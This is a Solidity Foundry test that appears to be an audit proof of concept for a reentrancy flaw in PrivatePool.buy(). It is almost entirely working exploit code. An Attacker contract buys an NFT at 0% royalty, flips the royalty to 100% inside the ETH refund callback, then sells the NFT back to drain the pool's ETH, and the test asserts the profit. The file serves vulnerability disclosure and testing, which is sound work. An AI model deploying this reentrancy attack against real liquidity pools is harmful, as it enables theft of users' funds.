// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/*
  Foundry PoC – Royalty double-fetch vulnerability in PrivatePool.buy()

  The test shows how an attacker can:
  1. Buy an NFT with 0% royalties.
  2. Re-enter through the ETH refund hook and set royalties to 100 %.
  3. Let the pool pay the (now high) royalty out of its own balance.
  4. Immediately sell the NFT back and steal the sale price.

  Result: the attacker ends up with the NFT’s full price in ETH while the pool
  only keeps the negligible fee – the cornerstone to drain all liquidity.
*/

import "forge-std/Test.sol";

import {PrivatePool}           from "src/PrivatePool.sol";
import {IRoyaltyRegistry}      from "royalty-registry-solidity/IRoyaltyRegistry.sol";
import {ERC721}                from "solmate/tokens/ERC721.sol";
import {ERC721TokenReceiver}   from "solmate/tokens/ERC721.sol";
import {ERC2981}               from "openzeppelin/contracts/token/common/ERC2981.sol";
import {IStolenNftOracle}      from "src/interfaces/IStolenNftOracle.sol";

/* -------------------------------------------------------------------------- */
/*                                   Mocks                                    */
/* -------------------------------------------------------------------------- */

contract MockFactory {
    uint16 public protocolFeeRate = 0;          // 0 ‰

    mapping(uint256 => address) internal _owner;

    function ownerOf(uint256 id) external view returns (address) {
        return _owner[id];
    }

    function setOwner(uint256 id, address owner) external {
        _owner[id] = owner;
    }

    receive() external payable {}
}

contract MockRegistry is IRoyaltyRegistry {
    address public lookup;

    constructor(address _lookup) {
        lookup = _lookup;
    }

    /* solhint-disable-next-line no-unused-vars */
    function getRoyaltyLookupAddress(address nft)
        external
        view
        override
        returns (address)
    {
        return lookup;
    }
}

/* -------------------------------------------------------------------------- */
/*                             Evil ERC-2981 NFT                              */
/* -------------------------------------------------------------------------- */

contract AttackNFT is ERC721("AttackNFT", "ATK"), ERC2981 {
    function tokenURI(uint256) public pure override returns (string memory) {
        return "";
    }

    function mint(address to, uint256 id) external {
        _mint(to, id);
    }

    function setRoyalty(uint96 bps, address receiver) external {
        _setDefaultRoyalty(receiver, bps);
    }

    function supportsInterface(bytes4 id)
        public
        view
        virtual
        override(ERC721, ERC2981)
        returns (bool)
    {
        return super.supportsInterface(id);
    }
}

/* -------------------------------------------------------------------------- */
/*                              Attacking wallet                              */
/* -------------------------------------------------------------------------- */

contract Attacker is ERC721TokenReceiver {
    PrivatePool  immutable pool;
    AttackNFT    immutable nft;

    bool         internal flipped;

    constructor(PrivatePool _pool, AttackNFT _nft) {
        pool = _pool;
        nft  = _nft;
    }

    /* attack:
       1. ensure royalty = 0
       2. buy NFT (send price + 1 wei)
       3. during refund callback -> flip royalty to 100 %
       4. sell NFT back and receive the full sale price                       */
    function pwn() external {
        uint256[] memory ids     = new uint256[](1);
        uint256[] memory weights = new uint256[](1);
        ids[0]     = 1;
        weights[0] = 1e18;

        // empty merkle proof ⇒ every NFT weight = 1e18
        PrivatePool.MerkleMultiProof memory proof;
        proof.proof = new bytes32[](0);
        proof.flags = new bool[](0);

        // start with 0% royalty
        nft.setRoyalty(0, address(this));

        (uint256 netInput,,) = pool.buyQuote(1e18);

        // buy – send a tiny bit extra to trigger the refund branch
        pool.buy{value: netInput + 1 wei}(ids, weights, proof);

        // sell back – stolen-NFT oracle disabled so empty array is fine
        IStolenNftOracle.Message[] memory msgs = new IStolenNftOracle.Message[](0);
        pool.sell(ids, weights, proof, msgs);
    }

    /* Refund callback executed in-between the two royaltyInfo() invocations.
       This is where we raise the royalty from 0 % to 100 %. */
    receive() external payable {
        if (!flipped) {
            flipped = true;
            nft.setRoyalty(10_000, address(this)); // 100 %
        }
    }
}

/* -------------------------------------------------------------------------- */
/*                                   Test                                     */
/* -------------------------------------------------------------------------- */

contract PrivatePoolRoyaltyExploitTest is Test {
    PrivatePool pool;
    AttackNFT   nft;
    Attacker    attacker;
    MockFactory factory;

    function setUp() public {
        /* 1. deploy contracts */
        nft     = new AttackNFT();
        factory = new MockFactory();
        MockRegistry registry = new MockRegistry(address(nft));

        pool = new PrivatePool(
            address(factory),
            address(registry),
            address(0)           // no stolen NFT oracle
        );

        /* 2. initialise pool (ETH base token) */
        pool.initialize(
            address(0),          // base token = ETH
            address(nft),
            10 ether,            // virtual base reserves
            10e18,               // virtual NFT reserves (10 NFTs)
            0,                   // changeFee
            0,                   // feeRate
            bytes32(0),          // merkleRoot (all weights = 1e18)
            false,               // useStolenNftOracle
            true                 // payRoyalties
        );

        /* 3. seed pool with one NFT and some ETH liquidity */
        nft.mint(address(pool), 1);
        vm.deal(address(pool), 10 ether); // enough to pay royalties

        /* 4. set up attacker */
        attacker = new Attacker(pool, nft);
        vm.deal(address(attacker), 2 ether); // funds for buy tx
    }

    function testExploitDrainBaseTokens() public {
        uint256 poolEthBefore     = address(pool).balance;
        uint256 attackerEthBefore = address(attacker).balance;

        vm.prank(address(attacker));
        attacker.pwn();

        uint256 poolEthAfter     = address(pool).balance;
        uint256 attackerEthAfter = address(attacker).balance;

        // attacker gained ≈ sale price (1 ether) while pool lost it
        assertGt(attackerEthAfter, attackerEthBefore, "attacker did not profit");
        assertLt(poolEthAfter,     poolEthBefore,     "pool not drained");
    }
}